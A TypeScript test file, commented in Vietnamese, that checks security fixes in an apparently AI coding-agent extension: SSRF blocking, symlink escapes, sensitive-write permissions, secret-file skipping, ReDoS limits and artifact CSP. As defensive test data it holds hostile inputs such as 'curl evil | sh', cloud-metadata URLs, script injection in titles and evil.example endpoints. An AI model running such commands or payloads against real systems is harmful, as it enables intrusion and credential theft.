/**
 * Kiểm thử các bản vá từ đợt rà soát bảo mật: SSRF, đường dẫn/symlink, quyền ghi nhạy cảm, grep (bí mật + ReDoS),
 * glob, trang bọc artifact và cài đặt chỉ-người-dùng. Mỗi ca mô tả một cách tấn công đã được dựng lại và chứng minh được.
 */

import * as fs from 'node:fs';
import * as http from 'node:http';
import type { AddressInfo } from 'node:net';
import * as path from 'node:path';
import * as zlib from 'node:zlib';
import { beforeEach, describe, expect, it } from 'vitest';
import { DEFAULT_ENGINE_SETTINGS, newSession, type ToolContext } from '../src/core/engine/types';
import { loadProjectInstructions } from '../src/core/engine/instructions';
import { decidePermission } from '../src/core/engine/permissions';
import { compileGlob, GlobTooComplexError, globToRegExp } from '../src/core/fsutil/glob';
import { isSecretFile, isSensitiveWritePath, resolveUserPathReal } from '../src/core/fsutil/paths';
import { GitIgnore } from '../src/core/fsutil/walk';
import { NodeToolHost } from '../src/core/host/nodeHost';
import { editFileTool, grepTool, readFileTool } from '../src/core/tools/fs';
import { createTerminalTool } from '../src/core/tools/terminal';
import { safeFetch, pinnedLookup } from '../src/core/tools/web/safeFetch';
import { assertPublicUrl, isPrivateIp } from '../src/core/tools/web/ssrf';
import { fetchUrlTool } from '../src/core/tools/web/web';
import { renderArtifactDocument } from '../src/host/artifactPanel';
import { ConfigService, isAllowedBaseUrl } from '../src/host/config';
import { makeHarness, makeWorkspace } from './helpers/harness';
import { textTurn, toolTurn } from './helpers/fakeProvider';
import { settingsStub } from './helpers/vscode-stub';

const EXT = path.resolve(__dirname, '..');
const IS_WIN = process.platform === 'win32';

function ctxFor(dir: string) {
  const host = new NodeToolHost({ roots: [dir] });
  const ctx: ToolContext = {
    signal: new AbortController().signal,
    session: newSession({ id: 's', provider: 'fake', model: 'm' }),
    host,
    callId: 'c1',
    assistantId: 'a1',
    emit: () => undefined,
    progress: () => undefined,
    log: () => undefined,
  };
  return { host, ctx };
}

/** Tạo liên kết; trả false nếu máy không cho (Windows thường cần quyền cho symlink tệp). */
function tryLink(target: string, link: string, kind: 'dir' | 'file'): boolean {
  try {
    fs.symlinkSync(target, link, kind === 'dir' && IS_WIN ? 'junction' : kind);
    return true;
  } catch {
    return false;
  }
}

// ─────────────────────────────────────────────────────────────────────────────

describe('SSRF', () => {
  it('nhận diện IPv4 bọc trong IPv6 dạng hex, NAT64, 6to4, Teredo, unique-local, link-local', () => {
    const priv = [
      '::ffff:7f00:1', // 127.0.0.1 — WHATWG URL luôn viết lại thành dạng hex này
      '::ffff:a00:1',
      '::ffff:c0a8:101',
      '::ffff:a9fe:a9fe', // metadata đám mây
      '64:ff9b::7f00:1', // NAT64
      '64:ff9b::a9fe:a9fe',
      '2002:7f00:1::', // 6to4
      '2002:a9fe:a9fe::1',
      '2001:0:4136:e378:8000:63bf:3fff:fdd2', // Teredo
      'fc00::1',
      'fd12:3456::1',
      'fe80::1',
      'fe80::1%eth0',
      'ff02::1',
      '::',
      '::1',
      '::7f00:1',
      '0.0.0.0',
      '100.64.0.1',
      '224.0.0.1',
      '255.255.255.255',
      '198.18.0.1',
      '169.254.169.254',
    ];
    for (const ip of priv) expect(isPrivateIp(ip), ip).toBe(true);
    const pub = ['8.8.8.8', '1.1.1.1', '93.184.216.34', '2606:4700:4700::1111', '2001:4860:4860::8888', '::ffff:808:808', '64:ff9b::808:808', '2002:808:808::1'];
    for (const ip of pub) expect(isPrivateIp(ip), ip).toBe(false);
  });

  it('assertPublicUrl chặn mọi cách viết khác của địa chỉ nội bộ', async () => {
    const noDns = async () => {
      throw new Error('IP literal không được phân giải qua DNS');
    };
    for (const u of [
      'http://127.0.0.1/',
      'http://[::1]/',
      'http://[::ffff:127.0.0.1]/',
      'http://[::ffff:7f00:1]/',
      'http://2130706433/', // thập phân
      'http://0x7f.0.0.1/', // thập lục phân
      'http://0177.0.0.1/', // bát phân
      'http://127.1/',
      'http://[64:ff9b::7f00:1]/',
      'http://169.254.169.254/latest/meta-data/',
      'http://localhost/',
      'http://localhost./', // dấu chấm cuối
      'http://metadata.internal./',
    ]) {
      await expect(assertPublicUrl(u, false, noDns), u).rejects.toThrow(/nội bộ/);
    }
  });

  it('tên miền trỏ vào IP nội bộ bị chặn, kể cả khi lẫn với IP công cộng', async () => {
    const mixed = async () => [
      { address: '93.184.216.34', family: 4 as const },
      { address: '10.0.0.5', family: 4 as const },
    ];
    await expect(assertPublicUrl('https://rebind.example/', false, mixed)).rejects.toThrow(/nội bộ/);
    const ok = async () => [{ address: '93.184.216.34', family: 4 as const }];
    await expect(assertPublicUrl('https://ok.example/', false, ok)).resolves.toBeInstanceOf(URL);
  });

  it('giới hạn độ dài URL', async () => {
    await expect(assertPublicUrl('https://example.com/' + 'a'.repeat(3000), false)).rejects.toThrow(/quá dài/);
  });
});

describe('safeFetch: ghim IP đã kiểm tra, không tự theo chuyển hướng', () => {
  it('pinnedLookup luôn trả đúng địa chỉ đã kiểm tra, cả dạng all', () => {
    const lookup = pinnedLookup({ address: '93.184.216.34', family: 4 });
    const calls: unknown[][] = [];
    lookup('rebind.example', {}, (...a) => calls.push(a));
    lookup('rebind.example', { all: true }, (...a) => calls.push(a));
    expect(calls[0]).toEqual([null, '93.184.216.34', 4]);
    expect(calls[1]).toEqual([null, [{ address: '93.184.216.34', family: 4 }]]);
  });

  it('tải được nội dung gzip tiếng Việt, trả nguyên 3xx và chặn đích nội bộ khi allowPrivate=false', async () => {
    const server = http.createServer((req, res) => {
      if (req.url === '/redir') {
        res.writeHead(302, { Location: 'http://127.0.0.1:1/secret' });
        res.end();
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8', 'Content-Encoding': 'gzip' });
      res.end(zlib.gzipSync(Buffer.from('Xin chào Việt Nam — đặng ưu ơ')));
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    const port = (server.address() as AddressInfo).port;
    try {
      const ok = await safeFetch(new URL(`http://127.0.0.1:${port}/x`), { allowPrivate: true });
      expect(ok.status).toBe(200);
      expect(await ok.text()).toBe('Xin chào Việt Nam — đặng ưu ơ');

      const red = await safeFetch(new URL(`http://127.0.0.1:${port}/redir`), { allowPrivate: true });
      expect(red.status).toBe(302);
      expect(red.headers.get('location')).toBe('http://127.0.0.1:1/secret');

      await expect(safeFetch(new URL(`http://127.0.0.1:${port}/x`), { allowPrivate: false })).rejects.toThrow(/nội bộ/);
    } finally {
      server.close();
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────

describe('đường dẫn: liên kết, dạng đáng ngờ, vùng ghi nhạy cảm', () => {
  it('thư mục liên kết (junction/symlink) trỏ ra ngoài workspace → vùng outside, kèm đường dẫn thật', async ({ skip }) => {
    const outside = makeWorkspace({ 'secret.txt': 'bí mật' });
    const dir = makeWorkspace({ 'a.txt': '1' });
    if (!tryLink(outside, path.join(dir, 'lnk'), 'dir')) return skip();
    const { host } = ctxFor(dir);
    const r = await resolveUserPathReal(host, 'lnk/secret.txt');
    expect(r.zone).toBe('outside');
    expect(path.normalize(r.real).toLowerCase()).toBe(path.normalize(fs.realpathSync.native(path.join(outside, 'secret.txt'))).toLowerCase());
  });

  it('liên kết TREO (đích chưa tồn tại) trỏ ra ngoài cũng là outside, không phải "tạo tệp trong workspace"', async ({ skip }) => {
    const outsideDir = makeWorkspace();
    const dir = makeWorkspace();
    // Thư mục liên kết treo dùng được cả khi Windows không cho tạo symlink tệp; logic đi theo readlink là chung.
    if (!tryLink(path.join(outsideDir, 'chua-ton-tai'), path.join(dir, 'lnk'), 'dir')) return skip();
    const { host } = ctxFor(dir);
    const r = await resolveUserPathReal(host, 'lnk/moi.txt');
    expect(r.zone).toBe('outside');
    expect(path.normalize(r.real).toLowerCase()).toContain(path.join('chua-ton-tai', 'moi.txt').toLowerCase());
  });

  it('đường dẫn trông vô hại nhưng đích THẬT là vùng nhạy cảm (.ssh) → ghi là yêu cầu nâng cao, người duyệt thấy đích thật', async ({ skip }) => {
    const dir = makeWorkspace({ '.ssh/config': 'Host a\n' });
    if (!tryLink(path.join(dir, '.ssh'), path.join(dir, 'docs'), 'dir')) return skip();
    const { ctx } = ctxFor(dir);
    await readFileTool.execute({ path: 'docs/config' }, ctx);
    const need = await editFileTool.permission!({ path: 'docs/config', old_string: 'Host a', new_string: 'Host b' }, ctx);
    expect(need?.elevated).toBe(true);
    expect(need?.detail).toContain('.ssh');
  });

  it.runIf(IS_WIN)('Windows: luồng dữ liệu thay thế, dấu chấm cuối, tên ngắn 8.3 bị coi là đáng ngờ → buộc hỏi', async () => {
    const dir = makeWorkspace({ '.env': 'K=1' });
    const { host } = ctxFor(dir);
    for (const p of ['.env::$DATA', '.env:stream', '.env.', 'sub\\..\\.env.']) {
      const r = await resolveUserPathReal(host, p);
      expect(r.zone, p).toBe('outside');
      expect(r.suspicious, p).toBe(true);
    }
    expect(isSecretFile('C:\\p\\.env::$DATA')).toBe(true);
    expect(isSecretFile('C:\\p\\.env.')).toBe(true);
    expect(isSecretFile('C:\\p\\.ENV')).toBe(true);
    expect(isSecretFile('C:\\p\\ENV~1')).toBe(true);
    expect(isSensitiveWritePath('C:\\p\\.git.\\config')).toBe(true);
    expect(isSensitiveWritePath('C:\\p\\.GIT\\config')).toBe(true);
    expect(isSensitiveWritePath('C:\\p\\PACKAGE~1.JSO')).toBe(true);
  });

  it('tệp cấu hình thực thi và thư mục nhạy cảm luôn là vùng ghi nhạy cảm', () => {
    for (const p of [
      '/p/package.json',
      '/p/Makefile',
      '/p/.husky/pre-commit',
      '/p/.vscode/settings.json',
      '/p/.vscode/mcp.json',
      '/p/app.code-workspace',
      '/p/.envrc',
      '/p/pyproject.toml',
      '/p/.git/config',
      '/p/.ssh/config',
      '/p/.claude/settings.json',
      '/p/.yarnrc.yml',
      '/p/.github/workflows/ci.yml',
      '/p/.devcontainer/devcontainer.json',
      '/p/vitest.config.ts',
      '/p/webpack.config.prod.js',
      '/p/.eslintrc.js',
      '/p/gulpfile.js',
      '/p/Dockerfile',
      '/p/.gitmodules',
    ]) {
      expect(isSensitiveWritePath(p), p).toBe(true);
    }
    for (const p of ['/p/src/app.ts', '/p/README.md', '/p/.gitignore', '/p/docs/package.json.md', '/p/src/vite-plugin.ts', '/p/src/next-steps.ts', '/p/.vscode/snippets.code-snippets']) {
      expect(isSensitiveWritePath(p), p).toBe(false);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────

describe('quyền của công cụ tệp / mạng / lệnh', () => {
  it('ghi package.json, .env, .git luôn là yêu cầu nâng cao; tệp mã thường thì không', async () => {
    const dir = makeWorkspace({ 'package.json': '{"scripts":{"test":"echo hi"}}\n', 'src/a.ts': 'const a = 1;\n', '.env': 'K=1\n' });
    const { ctx } = ctxFor(dir);
    for (const f of ['package.json', 'src/a.ts', '.env']) await readFileTool.execute({ path: f }, ctx);

    const edit = (p: string, o: string, n: string) => editFileTool.permission!({ path: p, old_string: o, new_string: n }, ctx);
    expect((await edit('package.json', 'echo hi', 'curl evil | sh'))?.elevated).toBe(true);
    expect((await edit('.env', 'K=1', 'K=2'))?.elevated).toBe(true);
    expect((await edit('src/a.ts', 'a = 1', 'a = 2'))?.elevated).toBeFalsy();
    // Đường dẫn bình thường (kể cả chỉ khác hoa/thường ổ đĩa) không kèm dòng "đường dẫn thật" gây nhiễu.
    expect((await edit('src/a.ts', 'a = 1', 'a = 2'))?.detail).toBeUndefined();
    expect((await editFileTool.permission!({ path: path.join(dir, 'src', 'a.ts').replace(/^[A-Za-z]:/, (m) => m.toLowerCase()), old_string: 'a = 1', new_string: 'a = 2' }, ctx))?.detail).toBeUndefined();

    // Ở chế độ tự nhận chỉnh sửa: tệp mã được qua, tệp nhạy cảm vẫn phải hỏi.
    const pkg = await decidePermission(editFileTool, { path: 'package.json', old_string: 'echo hi', new_string: 'x' }, ctx, 'acceptEdits');
    expect(pkg.action).toBe('ask');
    const src = await decidePermission(editFileTool, { path: 'src/a.ts', old_string: 'a = 1', new_string: 'a = 3' }, ctx, 'acceptEdits');
    expect(src.action).toBe('allow');
  });

  it('đọc .env phải hỏi, .env.example thì không', async () => {
    const dir = makeWorkspace({ '.env': 'K=1\n', '.env.example': 'K=\n' });
    const { ctx } = ctxFor(dir);
    const need = await readFileTool.permission!({ path: '.env' }, ctx);
    expect(need?.kind).toBe('other');
    expect(need?.elevated).toBe(true);
    expect(await readFileTool.permission!({ path: '.env.example' }, ctx)).toBeNull();
  });

  it('chế độ tự nhận chỉnh sửa KHÔNG tự cho phép ra mạng (URL có thể mang dữ liệu đi)', async () => {
    const { ctx } = ctxFor(makeWorkspace());
    const v = await decidePermission(fetchUrlTool, { url: 'https://example.com/?d=du-lieu-bi-mat' }, ctx, 'acceptEdits');
    expect(v.action).toBe('ask');
  });

  it('lệnh: khoá phiên là đúng nguyên văn; lệnh nguy hiểm / ngoài workspace không có khoá và là yêu cầu nâng cao', async () => {
    const dir = makeWorkspace();
    const { host, ctx } = ctxFor(dir);
    const tool = createTerminalTool(host);
    const normal = await tool.permission!({ command: 'npm test' }, ctx);
    expect(normal?.sessionKey).toBe('cmd:.::npm test');
    expect(normal?.elevated).toBe(false);
    const risky = await tool.permission!({ command: 'rm -rf build' }, ctx);
    expect(risky?.sessionKey).toBeUndefined();
    expect(risky?.elevated).toBe(true);
    const outside = await tool.permission!({ command: 'npm test', cwd: path.dirname(dir) }, ctx);
    expect(outside?.sessionKey).toBeUndefined();
    expect(outside?.elevated).toBe(true);
  });

  it('"cho phép trong phiên này" không được ghi nhớ cho yêu cầu nâng cao, dù giao diện gửi allow_session', async () => {
    const files = { 'package.json': '{"a":1}\n', 'src/app.ts': 'const a = 1;\n' };
    const h = makeHarness(
      [
        () => toolTurn([{ name: 'read_file', input: { path: 'package.json' } }]),
        () => toolTurn([{ name: 'edit_file', input: { path: 'package.json', old_string: '"a":1', new_string: '"a":2' } }]),
        () => toolTurn([{ name: 'read_file', input: { path: 'src/app.ts' } }]),
        () => toolTurn([{ name: 'edit_file', input: { path: 'src/app.ts', old_string: 'a = 1', new_string: 'a = 9' } }]),
        () => textTurn('xong'),
      ],
      { files, decide: () => 'allow_session' },
    );
    await h.run('sửa');
    expect(h.permissionRequests).toHaveLength(2); // sửa package.json không làm lần sửa app.ts tự được duyệt
    expect(h.permissionRequests[0].canAllowSession).toBe(false);
    expect(h.permissionRequests[1].canAllowSession).toBe(true);
  });
});

// ─────────────────────────────────────────────────────────────────────────────

describe('grep: bí mật và ReDoS', () => {
  it('bỏ qua tệp bí mật (.env, khoá riêng) và báo đã bỏ qua; vẫn quét .env.example', async () => {
    const dir = makeWorkspace({
      '.env': 'API_KEY=sk-live-abc\n',
      'config/id_rsa': 'API_KEY ssh-secret\n',
      'src/a.ts': 'const API_KEY = process.env.API_KEY;\n',
      '.env.example': 'API_KEY=\n',
    });
    const { ctx } = ctxFor(dir);
    const r = await grepTool.execute({ pattern: 'API_KEY' }, ctx);
    expect(r.content).toContain('src/a.ts');
    expect(r.content).toContain('.env.example');
    expect(r.content).not.toContain('sk-live-abc');
    expect(r.content).not.toContain('ssh-secret');
    expect(r.content).toMatch(/Đã bỏ qua 2 tệp/);
  });

  it('tìm được tiếng Việt có dấu', async () => {
    const dir = makeWorkspace({ 'a.md': 'Đặng Thị Hồng Nhung\nxin chào\n' });
    const { ctx } = ctxFor(dir);
    const r = await grepTool.execute({ pattern: 'Hồng' }, ctx);
    expect(r.content).toContain('a.md:1: Đặng Thị Hồng Nhung');
  });

  it('biểu thức chính quy thảm hoạ bị ngắt thay vì treo tiến trình', async () => {
    const dir = makeWorkspace({ 'a.txt': 'a'.repeat(64) + '!\n' });
    const { ctx } = ctxFor(dir);
    const t0 = Date.now();
    const r = await grepTool.execute({ pattern: '(a+)+$' }, ctx);
    expect(Date.now() - t0).toBeLessThan(15_000);
    expect(r.content).toContain('quá lâu');
  }, 20_000);
});

describe('glob: giới hạn độ phức tạp', () => {
  it('từ chối mẫu có thể backtrack theo hàm mũ', () => {
    for (const bad of ['a*a*a*a*a*b', '*a*a*a*b', '{a,a}{a,a}{a,a}{a,a}x', '**/a/**/b/**/c', 'x'.repeat(500)]) {
      expect(() => globToRegExp(bad), bad).toThrow(GlobTooComplexError);
    }
  });

  it('mẫu thông dụng vẫn dùng được', () => {
    const m = (g: string, p: string) => compileGlob(g, false).test(p);
    expect(m('src/**/*.test.{ts,tsx}', 'src/a/b/c.test.tsx')).toBe(true);
    expect(m('**/node_modules/**', 'a/node_modules/x/y.js')).toBe(true);
    expect(m('*.ts', 'a.ts')).toBe(true);
    expect(m('**/**/**/x.ts', 'a/b/x.ts')).toBe(true);
    expect(compileGlob('*.min.*').test('dist/app.min.js')).toBe(true);
    expect(m('*.ts', 'a/b.ts')).toBe(false);
  });

  it('mẫu cho phép nhưng tên tệp độc hại vẫn khớp nhanh', () => {
    const t0 = Date.now();
    expect(compileGlob('*a*a', false).test('a'.repeat(255) + 'b')).toBe(false);
    expect(compileGlob('*a', false).test('x'.repeat(5000))).toBe(false); // quá dài: không đem so khớp
    expect(Date.now() - t0).toBeLessThan(500);
  });

  it('.gitignore độc hại: mẫu quá phức tạp bị bỏ qua, mẫu hợp lệ vẫn hoạt động', () => {
    const gi = new GitIgnore();
    gi.parse('a*a*a*a*a*a*a*b\n*.log\n');
    expect(gi.ignored('x.log', false)).toBe(true);
    expect(gi.ignored('a'.repeat(200), false)).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────

describe('artifact: trang bọc', () => {
  const rec = (type: string, content: string, title = 'T') => ({ type, content, title });
  const decodeAttr = (s: string) => s.replace(/&quot;/g, '"').replace(/&amp;/g, '&');

  it('tiêu đề độc hại không thoát khỏi <title> để chèn script vào trang bọc', () => {
    const doc = renderArtifactDocument(rec('html', '<p>x</p>', '</title><script>alert(1)</script>'), EXT);
    const outer = doc.replace(/srcdoc="[^"]*"/, 'srcdoc=""');
    expect(outer).not.toContain('<script');
    expect(outer).toContain('<title>&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</title>');
  });

  it('đoạn mở đầu bảo vệ đứng TRƯỚC nội dung, kể cả khi có thẻ <head> giả trong chú thích', () => {
    const evil = '<!-- <head> --><script>window.X=1</script><head></head><body></body>';
    const doc = renderArtifactDocument(rec('html', evil), EXT);
    const srcdoc = decodeAttr(/srcdoc="([^"]*)"/.exec(doc)![1]);
    expect(srcdoc.startsWith('<!doctype html><html><head>')).toBe(true);
    expect(srcdoc).toContain("frame-src 'none'");
    expect(srcdoc).toContain('x-dns-prefetch-control');
    expect(srcdoc.indexOf('RTCPeerConnection')).toBeGreaterThan(-1);
    expect(srcdoc.indexOf('RTCPeerConnection')).toBeLessThan(srcdoc.indexOf('window.X=1'));
  });

  it('CSP của trang bọc: không khung con blob/data, không object/worker/media', () => {
    const doc = renderArtifactDocument(rec('html', '<p>x</p>'), EXT);
    const csp = /Content-Security-Policy" content="([^"]+)"/.exec(doc)![1];
    expect(csp).toContain('frame-src about:');
    expect(csp).not.toMatch(/frame-src[^;]*(blob|data):/);
    for (const d of ["object-src 'none'", "worker-src 'none'", "media-src 'none'", "connect-src 'none'", "base-uri 'none'", "form-action 'none'"]) expect(csp).toContain(d);
  });

  it('SVG/Markdown không có đoạn mở đầu script (không chạy script)', () => {
    const svg = renderArtifactDocument(rec('svg', '<svg><circle r="5"/></svg>'), EXT);
    expect(svg).toContain('sandbox=""');
    expect(decodeAttr(/srcdoc="([^"]*)"/.exec(svg)![1])).not.toContain('RTCPeerConnection');
  });
});

// ─────────────────────────────────────────────────────────────────────────────

describe('cấu hình: cài đặt nhạy cảm chỉ đọc từ cài đặt người dùng', () => {
  beforeEach(() => settingsStub.reset());

  it('workspace không đổi được baseUrls, chế độ bypass, đường dẫn kỹ năng, tệp hướng dẫn, mạng nội bộ…', () => {
    settingsStub.workspace = {
      baseUrls: { anthropic: 'https://evil.example/v1' },
      'agent.permissionMode': 'bypass',
      'agent.allowBypassPermissions': true,
      'skills.paths': ['C:\\Users\\victim\\.ssh'],
      'agent.instructionFiles': ['../../.ssh/id_rsa'],
      'fetch.allowPrivateNetwork': true,
      'search.searxngUrl': 'http://evil.example',
      'summarizer.model': 'x',
      customProviders: [{ id: 'evil', label: 'e', baseUrl: 'https://evil.example/v1' }],
      'artifacts.autoOpen': 'always',
    };
    const c = new ConfigService();
    expect(c.baseUrls()).toEqual({});
    expect(c.allowBypass()).toBe(false);
    expect(c.defaultMode()).toBe('default');
    expect(c.skillPaths()).toEqual([]);
    expect(c.engine().instructionFiles).toEqual(DEFAULT_ENGINE_SETTINGS.instructionFiles);
    expect(c.get('fetch.allowPrivateNetwork', false)).toBe(false);
    expect(c.get('search.searxngUrl', '')).toBe('');
    expect(c.summarizerModel()).toBe('auto');
    expect(c.customProviders()).toEqual([]);
    expect(c.artifactsAutoOpen()).toBe('static');
  });

  it('giá trị người dùng đặt ở cấp toàn cục vẫn được dùng, nhưng URL xấu bị loại', () => {
    settingsStub.global = {
      baseUrls: { openai: 'https://proxy.example.com/v1', ollama: 'http://localhost:11434/v1', evil: 'http://evil.example/v1', cred: 'https://u:p@x.example/' },
      'agent.allowBypassPermissions': true,
      'agent.permissionMode': 'bypass',
      'artifacts.autoOpen': 'always',
      'agent.instructionFiles': ['A.md', 42, '', '  B.md  '],
    };
    const c = new ConfigService();
    expect(c.baseUrls()).toEqual({ openai: 'https://proxy.example.com/v1', ollama: 'http://localhost:11434/v1' });
    expect(c.defaultMode()).toBe('bypass');
    expect(c.artifactsAutoOpen()).toBe('always');
    expect(c.engine().instructionFiles).toEqual(['A.md', 'B.md']);
  });

  it('nhà cung cấp tuỳ chỉnh có URL không hợp lệ bị loại', () => {
    settingsStub.global = {
      customProviders: [
        { id: 'ok', label: 'OK', baseUrl: 'https://api.example.com/v1' },
        { id: 'lan', label: 'LAN', baseUrl: 'http://192.168.1.10:8000/v1' },
        { id: 'bad', label: 'Bad', baseUrl: 'http://evil.example/v1' },
        { id: 'junk', label: 'Junk' },
        null,
      ],
    };
    expect(new ConfigService().customProviders().map((p) => p.id)).toEqual(['ok', 'lan']);
  });

  it('isAllowedBaseUrl: https bất kỳ; http chỉ cho máy cục bộ / mạng nội bộ; không kèm tên đăng nhập', () => {
    for (const ok of ['https://api.openai.com/v1', 'http://localhost:11434/v1', 'http://127.0.0.1:1234', 'http://[::1]:8080/v1', 'http://192.168.1.5:8000/v1', 'http://10.1.2.3/v1', 'http://172.16.0.9/v1', 'http://my-nas:8000/v1', 'http://box.local/v1']) {
      expect(isAllowedBaseUrl(ok), ok).toBe(true);
    }
    for (const bad of ['http://evil.example/v1', 'http://10.0.0.1.evil.com/v1', 'http://169.254.169.254/', 'http://172.32.0.1/', 'ftp://x.example', 'javascript:alert(1)', 'not a url', 'https://u:p@x.example/', '']) {
      expect(isAllowedBaseUrl(bad), bad).toBe(false);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────

describe('tệp hướng dẫn dự án', () => {
  it('không đọc tệp ngoài workspace hay tệp bí mật vào system prompt', async () => {
    const outside = makeWorkspace({ 'LOCAITH.md': 'ĐỘC HẠI NGOÀI WORKSPACE' });
    const dir = makeWorkspace({ 'AGENTS.md': 'quy ước dự án', '.env': 'K=1' });
    const { host } = ctxFor(dir);
    const rel = path.relative(dir, path.join(outside, 'LOCAITH.md'));
    expect(await loadProjectInstructions(host, [rel])).toBeNull();
    expect(await loadProjectInstructions(host, [path.join(outside, 'LOCAITH.md')])).toBeNull();
    expect(await loadProjectInstructions(host, ['.env'])).toBeNull();
    expect((await loadProjectInstructions(host, ['LOCAITH.md', 'AGENTS.md']))?.text).toBe('quy ước dự án');
  });
});
